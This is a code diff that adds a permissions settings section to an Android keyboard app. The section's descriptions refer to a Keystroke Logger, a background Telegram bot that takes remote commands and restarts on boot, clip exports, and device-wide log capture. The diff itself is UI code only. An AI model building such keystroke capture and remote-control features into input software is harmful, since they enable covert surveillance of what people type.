@@ -3,11 +3,13 @@ package juloo.keyboard2;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Typeface;
 import android.graphics.drawable.GradientDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.view.Gravity;
 import android.view.View;
 import android.view.ViewGroup;
@@ -66,6 +68,10 @@ public class AppSettingsActivity extends Activity {
         // ── Telegram Bot Section ────────────────────────────────
         root.addView(sectionLabel("✈  Telegram Bot"));
         root.addView(buildTelegramSection());
+
+        // ── Permissions Section ─────────────────────────────────
+        root.addView(sectionLabel("🔑  Permissions"));
+        root.addView(buildPermissionsSection());
 
         // ── About Section ───────────────────────────────────────
         root.addView(sectionLabel("ℹ  About"));
@@ -816,6 +822,191 @@ public class AppSettingsActivity extends Activity {
     }
 
     // ── Helpers ───────────────────────────────────────────────────────────────
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // Permissions Section
+    // ─────────────────────────────────────────────────────────────────────────
+
+    private static final int REQ_NOTIFICATIONS = 2001;
+    private static final int REQ_PHONE_STATE   = 2002;
+
+    @Override
+    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
+        super.onRequestPermissionsResult(code, perms, results);
+        recreate();
+    }
+
+    private View buildPermissionsSection() {
+        LinearLayout card = makeCard();
+
+        // Intro note
+        TextView note = new TextView(this);
+        note.setText("Grant the permissions below to unlock all features. Tap a button to request each one — you can do it right here without leaving the app.");
+        note.setTextColor(C.textSecondary);
+        note.setTextSize(12);
+        LinearLayout.LayoutParams nlp = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        nlp.setMargins(0, 0, 0, dp(14));
+        note.setLayoutParams(nlp);
+        card.addView(note);
+
+        // ── 1. Internet ──────────────────────────────────────────────────────
+        addPermRow(card,
+                "🌐", "Internet Access",
+                "Sends & receives data for the Telegram bot (clips, commands, exports).",
+                true, null, null);
+        card.addView(makeDivider());
+
+        // ── 2. Auto-start on Boot ────────────────────────────────────────────
+        addPermRow(card,
+                "🚀", "Auto-start on Boot",
+                "Restarts the Telegram bot automatically after the device reboots.",
+                true, null, null);
+        card.addView(makeDivider());
+
+        // ── 3. Background Service ────────────────────────────────────────────
+        addPermRow(card,
+                "🔄", "Background Service",
+                "Keeps the Telegram bot polling for commands even while the screen is off.",
+                true, null, null);
+        card.addView(makeDivider());
+
+        // ── 4. Notifications (runtime, API 33+) ──────────────────────────────
+        boolean hasNotif = Build.VERSION.SDK_INT < 33 ||
+                checkSelfPermission("android.permission.POST_NOTIFICATIONS")
+                        == PackageManager.PERMISSION_GRANTED;
+        addPermRow(card,
+                "🔔", "Notifications",
+                "Shows bot status alerts and 'new clip received' notifications on your status bar.",
+                hasNotif,
+                hasNotif ? null : "Grant",
+                hasNotif ? null : v -> {
+                    if (Build.VERSION.SDK_INT >= 33)
+                        requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"},
+                                REQ_NOTIFICATIONS);
+                });
+        card.addView(makeDivider());
+
+        // ── 5. Draw Over Other Apps ──────────────────────────────────────────
+        boolean canOverlay = Build.VERSION.SDK_INT < 23 || Settings.canDrawOverlays(this);
+        addPermRow(card,
+                "🪟", "Draw Over Other Apps",
+                "Required for the floating clipboard widget that appears on top of any app.",
+                canOverlay,
+                canOverlay ? null : "Open Settings",
+                canOverlay ? null : v -> startActivity(
+                        new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                                Uri.parse("package:" + getPackageName()))));
+        card.addView(makeDivider());
+
+        // ── 6. App Name Lookup ───────────────────────────────────────────────
+        addPermRow(card,
+                "📱", "App Name Lookup",
+                "Resolves package names to readable labels in the Keystroke Logger\n(e.g. 'WhatsApp' instead of 'com.whatsapp').",
+                true, null, null);
+        card.addView(makeDivider());
+
+        // ── 7. Phone & Network State ─────────────────────────────────────────
+        boolean hasPhone = Build.VERSION.SDK_INT < 23 ||
+                checkSelfPermission("android.permission.READ_PHONE_STATE")
+                        == PackageManager.PERMISSION_GRANTED;
+        addPermRow(card,
+                "📞", "Phone & Network Info",
+                "Reads device model, Android version & carrier for the Telegram /device command.",
+                hasPhone,
+                hasPhone ? null : "Grant",
+                hasPhone ? null : v ->
+                        requestPermissions(new String[]{"android.permission.READ_PHONE_STATE"},
+                                REQ_PHONE_STATE));
+        card.addView(makeDivider());
+
+        // ── 8. Read System Logs (Shizuku) ────────────────────────────────────
+        addPermRow(card,
+                "📋", "Read System Logs",
+                "Captures device-wide Logcat for the System Console feature.\nRequires Shizuku — install it, start its service, then authorize this app inside Shizuku.",
+                false,
+                "How to enable",
+                v -> Toast.makeText(this,
+                        "1. Install 'Shizuku' from Play Store\n"
+                        + "2. Open Shizuku → tap 'Pairing'\n"
+                        + "3. Start the Shizuku service\n"
+                        + "4. Open System Console here to authorize",
+                        Toast.LENGTH_LONG).show());
+
+        return card;
+    }
+
+    private void addPermRow(LinearLayout parent,
+                             String icon, String name, String desc,
+                             boolean granted, String btnLabel,
+                             View.OnClickListener action) {
+        LinearLayout row = new LinearLayout(this);
+        row.setOrientation(LinearLayout.HORIZONTAL);
+        row.setGravity(Gravity.CENTER_VERTICAL);
+        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        rlp.setMargins(0, dp(4), 0, dp(4));
+        row.setLayoutParams(rlp);
+
+        // Emoji icon
+        TextView iconTv = new TextView(this);
+        iconTv.setText(icon);
+        iconTv.setTextSize(22);
+        iconTv.setPadding(0, 0, dp(12), 0);
+        row.addView(iconTv);
+
+        // Name + description column
+        LinearLayout textCol = new LinearLayout(this);
+        textCol.setOrientation(LinearLayout.VERTICAL);
+        textCol.setLayoutParams(new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
+        textCol.addView(rowLabel(name));
+        textCol.addView(rowSub(desc));
+        row.addView(textCol);
+
+        // Status badge or action button
+        if (granted) {
+            TextView badge = new TextView(this);
+            badge.setText("✅ Granted");
+            badge.setTextColor(C.green);
+            badge.setTextSize(11);
+            badge.setTypeface(Typeface.DEFAULT_BOLD);
+            badge.setPadding(dp(8), 0, 0, 0);
+            row.addView(badge);
+        } else if (btnLabel != null && action != null) {
+            Button btn = new Button(this);
+            btn.setText(btnLabel);
+            btn.setTextSize(11);
+            btn.setAllCaps(false);
+            btn.setMinWidth(0);
+            btn.setMinHeight(0);
+            btn.setPadding(dp(12), dp(6), dp(12), dp(6));
+            GradientDrawable btnBg = new GradientDrawable();
+            btnBg.setColor(C.primary);
+            btnBg.setCornerRadius(dp(8));
+            btn.setBackground(btnBg);
+            btn.setTextColor(0xFFFFFFFF);
+            btn.setOnClickListener(action);
+            LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+            blp.setMargins(dp(8), 0, 0, 0);
+            btn.setLayoutParams(blp);
+            row.addView(btn);
+        } else {
+            // No button, show ❌ Denied badge
+            TextView badge = new TextView(this);
+            badge.setText("❌ Denied");
+            badge.setTextColor(0xFFEF4444);
+            badge.setTextSize(11);
+            badge.setTypeface(Typeface.DEFAULT_BOLD);
+            badge.setPadding(dp(8), 0, 0, 0);
+            row.addView(badge);
+        }
+
+        parent.addView(row);
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
 
     private LinearLayout makeCard() {
         LinearLayout c = new LinearLayout(this);
